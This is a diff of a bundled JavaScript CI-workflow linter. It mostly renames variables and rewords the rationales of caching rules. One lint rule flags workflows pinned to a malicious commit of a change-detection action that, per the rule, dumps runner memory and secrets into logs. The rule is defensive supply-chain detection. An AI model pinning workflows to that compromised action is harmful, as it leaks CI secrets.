+  const checkoutSha = string3(input2.checkoutSha, /^[a-f0-9]{40}(?:[a-f0-9]{24})?$/, "checkout revision");
+  const startedAt = time3(input2.startedAt);
+  const completedAt = time3(input2.completedAt);
   const durationMs = input2.durationMs;
   if (typeof durationMs !== "number" || !Number.isFinite(durationMs) || durationMs < 0 || durationMs > 14 * 864e5 || Date.parse(completedAt) < Date.parse(startedAt) || Math.abs(Date.parse(completedAt) - Date.parse(startedAt) - durationMs) > 1e3) {
     throw new Error("Execution duration is invalid or disagrees with wall-clock timestamps");
   }
-  const exitCode = input2.exitCode === null ? null : integer2(input2.exitCode, "exit code", 0);
-  const signal = input2.signal === null ? null : string2(input2.signal, /^SIG[A-Z0-9]{1,12}$/, "signal");
+  const exitCode = input2.exitCode === null ? null : integer4(input2.exitCode, "exit code", 0);
+  const signal = input2.signal === null ? null : string3(input2.signal, /^SIG[A-Z0-9]{1,12}$/, "signal");
   if (exitCode !== null && exitCode > 4294967295 || exitCode === null === (signal === null)) throw new Error("Execution requires either an exit code or termination signal");
   return {
     version: 1,
     repository,
-    runId: integer2(input2.runId, "run ID"),
-    runAttempt: integer2(input2.runAttempt, "attempt"),
+    runId: integer4(input2.runId, "run ID"),
+    runAttempt: integer4(input2.runAttempt, "attempt"),
     headSha,
     checkoutSha,
-    jobKey: string2(input2.jobKey, /^[A-Za-z_][A-Za-z0-9_-]{0,99}$/, "workflow job key"),
+    jobKey: string3(input2.jobKey, /^[A-Za-z_][A-Za-z0-9_-]{0,99}$/, "workflow job key"),
     projectPath: executionProjectPath(input2.projectPath),
-    task: string2(input2.task, /^[A-Za-z0-9][A-Za-z0-9_.: -]{0,127}$/, "task label"),
+    task: string3(input2.task, /^[A-Za-z0-9][A-Za-z0-9_.: -]{0,127}$/, "task label"),
     startedAt,
     completedAt,
     durationMs,
@@ -12664,21 +12664,21 @@ function createExecutionObservation(report, runObservationId, jobId, now2 = /* @
   validateExecutionObservation(result);
   return result;
 }
-function validateExecutionObservation(item, observation) {
+function validateExecutionObservation(item, observation2) {
   validateScope(item.repository);
   if (item.version !== 1 || item.provenance !== "operator-supplied" || !/^[a-f0-9]{64}$/.test(item.runObservationId)) throw new Error("Execution observation identity/provenance is invalid");
-  integer2(item.jobId, "job ID");
-  time2(item.recordedAt);
+  integer4(item.jobId, "job ID");
+  time3(item.recordedAt);
   const report = parseExecutionReport(item.report);
   if (identity(report) !== identity(item.report) || item.id !== executionObservationIdentity(item) || report.repository.host !== item.repository.host || report.repository.repositoryId !== item.repository.repositoryId) {
     throw new Error("Execution observation does not match its content");
   }
   if (Date.parse(item.recordedAt) < Date.parse(report.completedAt)) throw new Error("Execution observation cannot predate task completion");
-  if (!observation) return;
-  const run4 = observation.run;
+  if (!observation2) return;
+  const run4 = observation2.run;
   const job = run4.jobs.find(({ id }) => id === item.jobId);
   validateRevision(report.checkoutSha);
-  if (observation.id !== item.runObservationId || observation.repository.host !== item.repository.host || observation.repository.repositoryId !== item.repository.repositoryId || run4.runId !== report.runId || run4.runAttempt !== report.runAttempt || run4.headSha !== report.headSha || !job || job.key !== report.jobKey) {
+  if (observation2.id !== item.runObservationId || observation2.repository.host !== item.repository.host || observation2.repository.repositoryId !== item.repository.repositoryId || run4.runId !== report.runId || run4.runAttempt !== report.runAttempt || run4.headSha !== report.headSha || !job || job.key !== report.jobKey) {
     throw new Error("Execution report does not match the exact repository/run/attempt/job evidence");
   }
   if (Date.parse(report.startedAt) < Date.parse(job.startedAt) || Date.parse(report.completedAt) > Date.parse(job.completedAt)) {
@@ -12711,17 +12711,17 @@ function runWindowFromRows(query2, rows) {
     group.push(row);
     grouped.set(row.runId, group);
   }
-  const groups = [...grouped].slice(0, query2.limit).map(([runId, entries2]) => {
+  const groups = [...grouped].slice(0, query2.limit).map(([runId, entries3]) => {
     const observations = [];
-    for (const { id, observation } of entries2) {
-      if (!observation) continue;
-      validateRunObservation(observation);
-      if (observation.id !== id || observation.run.runId !== runId || observation.repository.host !== query2.host || observation.repository.repositoryId !== query2.repositoryId) {
+    for (const { id, observation: observation2 } of entries3) {
+      if (!observation2) continue;
+      validateRunObservation(observation2);
+      if (observation2.id !== id || observation2.run.runId !== runId || observation2.repository.host !== query2.host || observation2.repository.repositoryId !== query2.repositoryId) {
         throw new Error("Stored run window evidence does not match its indexed identity");
       }
-      observations.push(observation);
+      observations.push(observation2);
     }
-    const complete = entries2.length <= MAX_RUN_OBSERVATIONS && observations.length === entries2.length;
+    const complete = entries3.length <= MAX_RUN_OBSERVATIONS && observations.length === entries3.length;
     return { runId, complete, observations: complete ? structuredClone(observations) : [] };
   });
   return { complete: grouped.size <= query2.limit, groups };
@@ -13056,12 +13056,12 @@ var init_postgres_store = __esm({
         return rows.map(summary);
       }
       async saveRunObservation(input2, sourceInput) {
-        const observation = structuredClone(input2);
+        const observation2 = structuredClone(input2);
         const source = sourceInput ? structuredClone(sourceInput) : void 0;
-        validateRunObservation(observation);
+        validateRunObservation(observation2);
         if (source) {
           validateSnapshot(source);
-          validateRunSource(observation, source);
+          validateRunSource(observation2, source);
         }
         await this.sql.begin(async (sql) => {
           if (source) await this.insertSnapshot(sql, source);
@@ -13069,11 +13069,11 @@ var init_postgres_store = __esm({
         INSERT INTO knowledge_run_observations (
           id, version, host, repository_id, owner, repo, revision, run_id, run_attempt, workflow_id, observed_at, source_snapshot_id, observation
         ) VALUES (
-          ${observation.id}, ${observation.version}, ${observation.repository.host}, ${observation.repository.repositoryId},
-          ${observation.repository.owner}, ${observation.repository.repo}, ${observation.run.headSha}, ${observation.run.runId},
-          ${observation.run.runAttempt}, ${observation.run.workflowId}, ${observation.observedAt},
-          ${observation.source.status === "linked" ? observation.source.snapshotId : null},
-          ${sql.json(JSON.parse(JSON.stringify(observation)))}
+          ${observation2.id}, ${observation2.version}, ${observation2.repository.host}, ${observation2.repository.repositoryId},
+          ${observation2.repository.owner}, ${observation2.repository.repo}, ${observation2.run.headSha}, ${observation2.run.runId},
+          ${observation2.run.runAttempt}, ${observation2.run.workflowId}, ${observation2.observedAt},
+          ${observation2.source.status === "linked" ? observation2.source.snapshotId : null},
+          ${sql.json(JSON.parse(JSON.stringify(observation2)))}
         ) ON CONFLICT DO NOTHING
       `;
         });
@@ -13479,12 +13479,12 @@ var init_postgres_store = __esm({
           AND id IN ${sql(allObservationIds)}
       `;
           if (selected.length !== allObservationIds.length) throw new Error("Mitigation evaluation references unavailable run evidence");
-          const runIds = [...new Set(selected.map(({ observation }) => observation.run.runId))];
+          const runIds = [...new Set(selected.map(({ observation: observation2 }) => observation2.run.runId))];
           const observations = runIds.length === 0 ? [] : (await sql`
         SELECT observation FROM knowledge_run_observations
         WHERE host = ${evaluation.target.host} AND repository_id = ${evaluation.target.repositoryId}
           AND run_id IN ${sql(runIds)}
-      `).map(({ observation }) => observation);
+      `).map(({ observation: observation2 }) => observation2);
           verifyMitigationEvaluation(applicationRow.application, evaluation, events.map(({ event }) => event), observations);
           const inserted = await sql`
         INSERT INTO mitigation_evaluations (id, version, host, repository_id, application_id, evaluated_at, outcome, evaluation)
@@ -13585,10 +13585,10 @@ function restClient(options = {}) {
       if (options.token) headers.authorization = `Bearer ${options.token}`;
       if (hasBody) headers["content-type"] = "application/json";
       const response = await doFetch(url, { method, headers, ...hasBody ? { body: JSON.stringify(remaining) } : {} });
-      const text6 = await response.text();
-      let data = text6;
+      const text7 = await response.text();
+      let data = text7;
       try {
-        data = text6 ? JSON.parse(text6) : void 0;
+        data = text7 ? JSON.parse(text7) : void 0;
       } catch {
       }
       if (!response.ok) {
@@ -13627,14 +13627,14 @@ function repoFrom(value2, io) {
   }
 }
 var resolvePath = (io, path) => isAbsolute(path) ? path : resolve(io.cwd, path);
-async function writeText(io, path, text6) {
+async function writeText(io, path, text7) {
   if (!path || path === "-") {
-    io.stdout(text6);
+    io.stdout(text7);
     return;
   }
   const target = resolvePath(io, path);
   await mkdir(dirname(target), { recursive: true });
-  await writeFile(target, text6.endsWith("\n") ? text6 : `${text6}
+  await writeFile(target, text7.endsWith("\n") ? text7 : `${text7}
 `, "utf8");
 }
 var MAX_OUTPUT = 64 * 1024;
@@ -13695,7 +13695,7 @@ function actionInvocation(argv, env, processCwd) {
 }
 
 // src/cli/index.ts
-import { parseArgs as parseArgs10 } from "node:util";
+import { parseArgs as parseArgs12 } from "node:util";
 
 // src/lint/parsers/workflow.ts
 var import_yaml2 = __toESM(require_dist(), 1);
@@ -14072,8 +14072,8 @@ function newline(content2) {
 }
 function replaceOnLine(file, line, search, replacement3) {
   const start2 = lineStart(file.content, line);
-  const text6 = lineText(file.content, line);
-  const match2 = typeof search === "string" ? { index: text6.indexOf(search), 0: search } : search.exec(text6);
+  const text7 = lineText(file.content, line);
+  const match2 = typeof search === "string" ? { index: text7.indexOf(search), 0: search } : search.exec(text7);
   if (!match2 || match2.index < 0) return void 0;
   return { path: file.path, start: start2 + match2.index, end: start2 + match2.index + match2[0].length, text: replacement3 };
 }
@@ -14082,8 +14082,8 @@ function insertLinesAfter(file, line, lines) {
   if (line <= 0) return { path: file.path, start: 0, end: 0, text: lines.map((entry2) => entry2 + eol).join("") };
   const start2 = lineStart(file.content, line + 1);
   const atEnd = start2 >= file.content.length && !file.content.endsWith("\n");
-  const text6 = (atEnd ? eol : "") + lines.map((entry2) => entry2 + eol).join("");
-  return { path: file.path, start: start2, end: start2, text: text6 };
+  const text7 = (atEnd ? eol : "") + lines.map((entry2) => entry2 + eol).join("");
+  return { path: file.path, start: start2, end: start2, text: text7 };
 }
 function fix(description, ...edits) {
   const defined = edits.filter((edit) => edit !== void 0);
@@ -14200,17 +14200,17 @@ function commandTokens(command) {
 function shellWords(command) {
   return commandTokens(command).map((token) => token.value);
 }
-function withoutContinuations(text6) {
+function withoutContinuations(text7) {
   let result = "";
   let quote2;
-  for (let index = 0; index < text6.length; index += 1) {
-    const char = text6.charAt(index);
+  for (let index = 0; index < text7.length; index += 1) {
+    const char = text7.charAt(index);
     if (char === "\\" && quote2 !== "'") {
-      if (text6.charAt(index + 1) === "\n" || text6.slice(index + 1, index + 3) === "\r\n") {
-        index += text6.charAt(index + 1) === "\r" ? 2 : 1;
+      if (text7.charAt(index + 1) === "\n" || text7.slice(index + 1, index + 3) === "\r\n") {
+        index += text7.charAt(index + 1) === "\r" ? 2 : 1;
         continue;
       }
-      result += char + text6.charAt(++index);
+      result += char + text7.charAt(++index);
       continue;
     }
     if (quote2 === char) quote2 = void 0;
@@ -14382,30 +14382,30 @@ function isKnownMonorepo(project) {
 }
 var DIFF_BASE_REF = /\borigin\/|\$\{\{\s*github\.(?:event\.pull_request\.base\.(?:sha|ref)|base_ref|event\.before)\s*\}\}|\bHEAD[~^]/;
 function affectedTooling(command) {
-  const text6 = command.replace(/["']/g, "");
-  if (/^(?:echo|printf)\b/.test(text6)) return void 0;
-  if (/\bnx\s+affected\b/.test(text6)) return "nx affected";
-  if (/\bturbo\b.*\s--affected\b/.test(text6)) return "turbo --affected";
-  if (/\bturbo\b.*\s(?:--filter|-F)(?:=|\s+)\S*\[[^\]\s]+\]/.test(text6)) return "turbo --filter=...[ref]";
-  if (/\bpnpm\b.*\s(?:--filter|-F)(?:=|\s+)\S*\[[^\]\s]+\]/.test(text6)) return "pnpm --filter ...[ref]";
-  if (/\s--(?:changedSince|changed-since)\b/.test(text6)) return "jest --changedSince";
-  if (/\s--lastCommit\b/.test(text6)) return "jest --lastCommit";
-  if (/\s--(?:onlyChanged|only-changed)\b/.test(text6)) return "jest --onlyChanged";
-  if (/\bvitest\b.*\s--changed\b/.test(text6)) return "vitest --changed";
-  if (/\blerna\b.*\s--since\b/.test(text6)) return "lerna --since";
-  if (/\byarn\b.*\bworkspaces\s+foreach\b.*\s--since\b/.test(text6)) return "yarn workspaces foreach --since";
-  if (/\bgit\s+merge-base\b/.test(text6)) return "git merge-base";
-  if (/\bgit\s+diff\b/.test(text6) && DIFF_BASE_REF.test(command)) return "git diff against the base";
+  const text7 = command.replace(/["']/g, "");
+  if (/^(?:echo|printf)\b/.test(text7)) return void 0;
+  if (/\bnx\s+affected\b/.test(text7)) return "nx affected";
+  if (/\bturbo\b.*\s--affected\b/.test(text7)) return "turbo --affected";
+  if (/\bturbo\b.*\s(?:--filter|-F)(?:=|\s+)\S*\[[^\]\s]+\]/.test(text7)) return "turbo --filter=...[ref]";
+  if (/\bpnpm\b.*\s(?:--filter|-F)(?:=|\s+)\S*\[[^\]\s]+\]/.test(text7)) return "pnpm --filter ...[ref]";
+  if (/\s--(?:changedSince|changed-since)\b/.test(text7)) return "jest --changedSince";
+  if (/\s--lastCommit\b/.test(text7)) return "jest --lastCommit";
+  if (/\s--(?:onlyChanged|only-changed)\b/.test(text7)) return "jest --onlyChanged";
+  if (/\bvitest\b.*\s--changed\b/.test(text7)) return "vitest --changed";
+  if (/\blerna\b.*\s--since\b/.test(text7)) return "lerna --since";
+  if (/\byarn\b.*\bworkspaces\s+foreach\b.*\s--since\b/.test(text7)) return "yarn workspaces foreach --since";
+  if (/\bgit\s+merge-base\b/.test(text7)) return "git merge-base";
+  if (/\bgit\s+diff\b/.test(text7) && DIFF_BASE_REF.test(command)) return "git diff against the base";
   return void 0;
 }
-function parseActionVersion(text6, source) {
-  const match2 = /^v(\d+)(?:\.(\d+))?(?:\.(\d+))?$/.exec(text6);
+function parseActionVersion(text7, source) {
+  const match2 = /^v(\d+)(?:\.(\d+))?(?:\.(\d+))?$/.exec(text7);
   if (!match2) return void 0;
   return {
     major: Number(match2[1]),
     minor: match2[2] !== void 0 ? Number(match2[2]) : void 0,
     patch: match2[3] !== void 0 ? Number(match2[3]) : void 0,
-    text: text6,
+    text: text7,
     source
   };
 }
@@ -14454,8 +14454,8 @@ function collectJobs(project, workflow, seen) {
   return result;
 }
 function consumesChangeOutput(job) {
-  const text6 = `${job.if ?? ""} ${job.matrix ? JSON.stringify(job.matrix) : ""}`;
-  return [...text6.matchAll(NEEDS_OUTPUT)].some((match2) => CHANGE_NAME.test(match2[1] ?? "") || CHANGE_NAME.test(match2[2] ?? ""));
+  const text7 = `${job.if ?? ""} ${job.matrix ? JSON.stringify(job.matrix) : ""}`;
+  return [...text7.matchAll(NEEDS_OUTPUT)].some((match2) => CHANGE_NAME.test(match2[1] ?? "") || CHANGE_NAME.test(match2[2] ?? ""));
 }
 function detectsChanges(project, { workflow, job }) {
   if (consumesChangeOutput(job)) return true;
@@ -14753,10 +14753,10 @@ var trusted_change_detection_default = defineRule({
       const uses = step.uses;
       if (!uses || uses.action.kind !== "remote" || uses.action.name !== ACTION) continue;
       const ref = uses.action.ref?.toLowerCase();
-      const location2 = { path: workflow.path, line: uses.line, key: `${step.key}.uses`, suggestion: SUGGESTION };
+      const location3 = { path: workflow.path, line: uses.line, key: `${step.key}.uses`, suggestion: SUGGESTION };
       if (ref === MALICIOUS_SHA) {
         report({
-          ...location2,
+          ...location3,
           message: `${ACTION} is pinned to ${MALICIOUS_SHA.slice(0, 7)}, the malicious commit from ${ADVISORY} that dumps runner memory, including secrets, into the workflow log.`
         });
         continue;
@@ -14767,7 +14767,7 @@ var trusted_change_detection_default = defineRule({
       if (!vulnerable) continue;
       const shown = version.source === "comment" ? `${ACTION}@${ref?.slice(0, 7) ?? ""} (${version.text})` : `${ACTION}@${version.text}`;
       report({
-        ...location2,
+        ...location3,
         message: `${shown} is in the range affected by ${ADVISORY}, the March 2025 compromise that leaked CI secrets; the fix is v46.0.1.`,
         ...version.source === "comment" ? { confidence: "medium" } : {}
       });
@@ -14956,7 +14956,7 @@ var build_tool_cache_default = defineRule({
     id: "caching/build-tool-cache",
     ruleset: "caching",
     description: "Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs.",
-    rationale: "Gradle, Maven, Cargo, Bazel, Turborepo and Nx skip downloads and unchanged work when their caches are warm, but hosted runners start empty. Without a cache action or a remote cache, every run (and every agent iteration) rebuilds from scratch.",
+    rationale: "Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster.",
     kind: "practice",
     defaultSeverity: "info",
     presets: ["recommended", "agentic"],
@@ -15017,7 +15017,7 @@ var cache_key_default = defineRule({
     id: "caching/cache-key",
     ruleset: "caching",
     description: "actions/cache keys must invalidate when inputs change and still hit between runs.",
-    rationale: "A static key never changes, so the cache goes stale forever (caches are immutable once saved). A key containing the commit SHA or run id without `restore-keys` misses on every run, paying the upload cost with no benefit. Caching node_modules for `npm ci` is wasted work because `npm ci` deletes node_modules before installing.",
+    rationale: "A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic", "strict"],
@@ -15043,14 +15043,14 @@ var cache_key_default = defineRule({
           if (!save && !usesAction(step, "actions/cache", "actions/cache/restore")) continue;
           const key2 = step.with.get("key");
           if (key2 && key2.kind === "literal" && key2.value !== null && key2.value !== void 0 && String(key2.value).trim() !== "") {
-            const text6 = String(key2.value);
+            const text7 = String(key2.value);
             report({
               path: workflow.path,
               line: key2.line,
               key: `${step.key}:static-key`,
-              message: `Cache key \`${text6}\` is static, so the cache is never invalidated when dependencies change.`,
+              message: `Cache key \`${text7}\` is static and does not encode dependency changes.`,
               suggestion: "Include a hash of the inputs, e.g. `key: deps-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}`, plus `restore-keys` for partial hits.",
-              confidence: /\d/.test(text6) ? "medium" : "high"
+              confidence: /\d/.test(text7) ? "medium" : "high"
             });
           } else if (key2 && typeof key2.value === "string" && VOLATILE.test(key2.value) && !save && !step.with.has("restore-keys")) {
             const match2 = VOLATILE.exec(key2.value)?.[0] ?? "github.sha";
@@ -15058,7 +15058,7 @@ var cache_key_default = defineRule({
               path: workflow.path,
               line: key2.line,
               key: `${step.key}:volatile-key`,
-              message: `Cache key includes \`${match2}\` but has no \`restore-keys\`, so every run misses the cache.`,
+              message: `Cache key includes \`${match2}\` but has no explicit \`restore-keys\`; different context values can limit cache reuse.`,
               suggestion: "Add `restore-keys` with the key's stable prefix, or key on a hash of the inputs (`hashFiles(...)`) instead."
             });
           }
@@ -15085,13 +15085,13 @@ var cache_key_default = defineRule({
 // src/lint/rules/caching/docker-layer-cache.ts
 function cacheEntries(entry2) {
   if (!entry2 || entry2.kind === "expression" || typeof entry2.value !== "string") return [];
-  return listOf(entry2.value).map((text6) => {
+  return listOf(entry2.value).map((text7) => {
     const attributes = /* @__PURE__ */ new Map();
-    for (const part2 of text6.split(",")) {
+    for (const part2 of text7.split(",")) {
       const eq = part2.indexOf("=");
       if (eq > 0) attributes.set(part2.slice(0, eq).trim().toLowerCase(), part2.slice(eq + 1).trim());
     }
-    const type = attributes.get("type") ?? (text6.includes("=") ? "" : "registry");
+    const type = attributes.get("type") ?? (text7.includes("=") ? "" : "registry");
     return { type: type.toLowerCase(), attributes, line: entry2.line };
   });
 }
@@ -15109,7 +15109,7 @@ var docker_layer_cache_default = defineRule({
     id: "caching/docker-layer-cache",
     ruleset: "caching",
     description: "Docker image builds in CI should import and export a layer cache.",
-    rationale: "Hosted runners start with an empty BuildKit cache, so without `cache-from`/`cache-to` every layer (including dependency installs) is rebuilt on every run. The GitHub Actions cache backend defaults every build to the same `buildkit` scope, so multiple images overwrite each other's cache unless each gets a unique `scope`. Inline cache only supports `mode=min` (final-stage layers); a registry cache with `mode=max` also caches intermediate stages.",
+    rationale: "Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic"],
@@ -15144,8 +15144,8 @@ var docker_layer_cache_default = defineRule({
           });
           continue;
         }
-        const entries2 = [...cacheEntries(cacheTo2), ...cacheEntries(cacheFrom)];
-        const unscoped = entries2.find((entry2) => entry2.type === "gha" && !entry2.attributes.has("scope"));
+        const entries3 = [...cacheEntries(cacheTo2), ...cacheEntries(cacheFrom)];
+        const unscoped = entries3.find((entry2) => entry2.type === "gha" && !entry2.attributes.has("scope"));
         if (unscoped && buildPushCount >= 2) {
           report({
             path: workflow.path,
@@ -15155,7 +15155,7 @@ var docker_layer_cache_default = defineRule({
             suggestion: "Give each image a unique scope, e.g. `cache-from: type=gha,scope=<image>` and `cache-to: type=gha,mode=max,scope=<image>`."
           });
         }
-        const inline = entries2.find((entry2) => entry2.type === "inline");
+        const inline = entries3.find((entry2) => entry2.type === "inline");
         if (inline) {
           report({
             path: workflow.path,
@@ -15234,10 +15234,10 @@ function matrixCombinations(matrix) {
   const all = [...combinations, ...added];
   return all.length <= CAP ? all : void 0;
 }
-function matrixText(text6, combination) {
+function matrixText(text7, combination) {
   let known2 = true;
-  const resolved = text6.replace(/\$\{\{([\s\S]*?)\}\}/g, (_match, expression) => {
-    const path = /^matrix((?:\.[A-Za-z_][A-Za-z0-9_-]*)+)$/.exec(expression.trim())?.[1];
+  const resolved = text7.replace(/\$\{\{([\s\S]*?)\}\}/g, (_match, expression2) => {
+    const path = /^matrix((?:\.[A-Za-z_][A-Za-z0-9_-]*)+)$/.exec(expression2.trim())?.[1];
     if (!path) {
       known2 = false;
       return "";
@@ -15286,16 +15286,16 @@ function matrixValue(combo, path) {
 }
 var EXPRESSION = /\$\{\{([\s\S]*?)\}\}/g;
 var MATRIX_PATH = /^matrix((?:\.[A-Za-z_][A-Za-z0-9_-]*)+)$/;
-function substitute(text6, term) {
+function substitute(text7, term) {
   let out = "";
   let last = 0;
-  for (const match2 of text6.matchAll(EXPRESSION)) {
+  for (const match2 of text7.matchAll(EXPRESSION)) {
     const value2 = term((match2[1] ?? "").trim());
     if (value2 === void 0) return void 0;
-    out += text6.slice(last, match2.index) + value2;
+    out += text7.slice(last, match2.index) + value2;
     last = match2.index + match2[0].length;
   }
-  return out + text6.slice(last);
+  return out + text7.slice(last);
 }
 function platformOf(label) {
   const name = label.trim().toLowerCase();
@@ -15314,8 +15314,8 @@ function legsOf(job) {
   const combos = matrixCombinations(job.matrix) ?? [];
   const legs = [];
   for (const combo of combos) {
-    const label = substitute(runsOn, (expression) => {
-      const path = MATRIX_PATH.exec(expression)?.[1];
+    const label = substitute(runsOn, (expression2) => {
+      const path = MATRIX_PATH.exec(expression2)?.[1];
       return path === void 0 ? void 0 : matrixValue(combo, path.slice(1));
     });
     const platform = label === void 0 ? void 0 : platformOf(label);
@@ -15333,17 +15333,17 @@ function envResolver(workflow, job, step) {
     return independent ? `env.${name}` : void 0;
   };
 }
-function evaluate(text6, leg, env) {
-  return substitute(text6, (expression) => {
-    if (expression === "runner.os") return leg.os;
-    if (expression === "runner.arch") return leg.arch ?? `arch(${leg.label})`;
-    const path = MATRIX_PATH.exec(expression)?.[1];
+function evaluate(text7, leg, env) {
+  return substitute(text7, (expression2) => {
+    if (expression2 === "runner.os") return leg.os;
+    if (expression2 === "runner.arch") return leg.arch ?? `arch(${leg.label})`;
+    const path = MATRIX_PATH.exec(expression2)?.[1];
     if (path !== void 0) return matrixValue(leg.combo, path.slice(1));
-    const variable = /^env\.([A-Za-z_][A-Za-z0-9_-]*)$/.exec(expression)?.[1];
+    const variable = /^env\.([A-Za-z_][A-Za-z0-9_-]*)$/.exec(expression2)?.[1];
     if (variable !== void 0) return env(variable);
-    if (LEG_DEPENDENT.test(expression.replace(/'(?:[^']|'')*'/g, "''"))) return void 0;
-    if (leg.os === "Windows" && /hashFiles/i.test(expression)) return `{${expression}@windows}`;
-    return `{${expression}}`;
+    if (LEG_DEPENDENT.test(expression2.replace(/'(?:[^']|'')*'/g, "''"))) return void 0;
+    if (leg.os === "Windows" && /hashFiles/i.test(expression2)) return `{${expression2}@windows}`;
+    return `{${expression2}}`;
   });
 }
 function targetOf(job, step) {
@@ -15406,8 +15406,8 @@ var matrix_cache_key_missing_os_default = defineRule({
           const crossOsInputs = [.../* @__PURE__ */ new Set([keyStep, saveStep])].map((candidate) => candidate.with.get("enableCrossOsArchive"));
           if (crossOsInputs.some((input2) => input2 !== void 0 && input2.kind !== "literal")) continue;
           const crossOs = crossOsInputs.every((input2) => isTrue(input2?.value));
-          const entries2 = listOf(path).filter((entry2) => !entry2.startsWith("!"));
-          if (entries2.length > 0 && entries2.every((entry2) => NEUTRAL_PATHS.has(entry2.replace(/\/+$/, "")))) continue;
+          const entries3 = listOf(path).filter((entry2) => !entry2.startsWith("!"));
+          if (entries3.length > 0 && entries3.every((entry2) => NEUTRAL_PATHS.has(entry2.replace(/\/+$/, "")))) continue;
           const keyEnv = envResolver(workflow, job, keyStep);
           const pathEnv = envResolver(workflow, job, saveStep);
           const signatures2 = legs.map((leg) => {
@@ -15678,13 +15678,13 @@ function checkNode(project, step, before, all, file) {
   } else if (manager === "yarn") {
     fixable &&= declared === void 0 || declared.startsWith("yarn@1") || commands.some((command) => /^corepack\s+enable\b/.test(command));
   }
-  const location2 = rootLock ?? lockfiles.find((path) => NODE_LOCKFILES[basename(path)] === manager) ?? "";
-  const extra = hasDependencyPath || rootLock ? "" : ` and \`cache-dependency-path: ${location2}\``;
+  const location3 = rootLock ?? lockfiles.find((path) => NODE_LOCKFILES[basename(path)] === manager) ?? "";
+  const extra = hasDependencyPath || rootLock ? "" : ` and \`cache-dependency-path: ${location3}\``;
   const order = manager === "pnpm" && !fixable ? " (pnpm must be installed before setup-node, e.g. with pnpm/action-setup)" : "";
   return {
     managers: [manager],
     ...fixable ? { fixValue: manager } : {},
-    message: `\`actions/setup-node\` does not cache ${LABEL[manager]} dependencies (${basename(location2)} found).`,
+    message: `\`actions/setup-node\` does not cache ${LABEL[manager]} dependencies (${basename(location3)} found).`,
     suggestion: `Add \`cache: ${manager}\`${extra} to the step's \`with:\`${order} so the package download cache is restored between runs.`
   };
 }
@@ -15769,8 +15769,8 @@ function cacheFix(file, step, value2) {
   const direct2 = [...step.with.values()].filter((entry2) => entry2.origin === "direct" && entry2.line > step.line);
   if (direct2.length === 0 || direct2.length !== step.with.size) return void 0;
   const first = Math.min(...direct2.map((entry2) => entry2.line));
-  const text6 = lineText(file.content, first);
-  if (!/^\s*[A-Za-z0-9_-]+\s*:/.test(text6) || /[{}]/.test(text6)) return void 0;
+  const text7 = lineText(file.content, first);
+  if (!/^\s*[A-Za-z0-9_-]+\s*:/.test(text7) || /[{}]/.test(text7)) return void 0;
   let withLine;
   for (let line = first - 1; line >= step.line; line -= 1) {
     const candidate = lineText(file.content, line);
@@ -15788,7 +15788,7 @@ var setup_cache_default = defineRule({
     id: "caching/setup-cache",
     ruleset: "caching",
     description: "Language setup actions should cache downloaded dependencies.",
-    rationale: "Without caching, every run re-downloads all dependencies from the registry, which is often the slowest part of a job and is repeated on every agent iteration. setup-node, setup-python, setup-java and setup-dotnet only cache when `cache` is set (setup-node v6+ auto-caches npm only when package.json `packageManager` names npm); setup-go caches by default.",
+    rationale: "Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default.",
     kind: "practice",
     defaultSeverity: "warn",
     presets: ["recommended", "agentic"],
@@ -15871,9 +15871,9 @@ var uncompressed_artifact_upload_default = defineRule({
       if (major === void 0 || major < 4 || major > 7) continue;
       const path = step.with.get("path");
       if (!path || path.kind === "expression" || typeof path.value !== "string") continue;
-      const entries2 = listOf(path.value).filter((entry2) => !entry2.startsWith("!"));
-      if (entries2.length === 0 || !entries2.every((entry2) => COMPRESSED.test(entry2))) continue;
-      const shown = entries2.map((entry2) => `\`${entry2}\``).join(", ");
+      const entries3 = listOf(path.value).filter((entry2) => !entry2.startsWith("!"));
+      if (entries3.length === 0 || !entries3.every((entry2) => COMPRESSED.test(entry2))) continue;
+      const shown = entries3.map((entry2) => `\`${entry2}\``).join(", ");
       report({
         path: workflow.path,
         line: stepLine(step),
@@ -15885,8 +15885,8 @@ var uncompressed_artifact_upload_default = defineRule({
           `- uses: ${step.uses?.value ?? "actions/upload-artifact@v7"}`,
           "  with:",
           ...[...step.with.entries()].filter(([, entry2]) => typeof entry2.value !== "object").flatMap(([name, entry2]) => {
-            const lines = String(entry2.value).split(/\r?\n/).filter((text6) => text6.trim() !== "");
-            return lines.length <= 1 ? [`    ${name}: ${String(entry2.value).trim()}`] : [`    ${name}: |`, ...lines.map((text6) => `      ${text6.trim()}`)];
+            const lines = String(entry2.value).split(/\r?\n/).filter((text7) => text7.trim() !== "");
+            return lines.length <= 1 ? [`    ${name}: ${String(entry2.value).trim()}`] : [`    ${name}: |`, ...lines.map((text7) => `      ${text7.trim()}`)];
           }),
           "    compression-level: 0"
         ].join("\n"),
@@ -15919,9 +15919,9 @@ function isShallow(step) {
   return !depth || depth.kind === "literal" && (depth.value === 1 || depth.value === "1");
 }
 function hasNoBase(command, tool2) {
-  const text6 = command.replace(/["']/g, "");
+  const text7 = command.replace(/["']/g, "");
   if (tool2 === "jest --onlyChanged") return true;
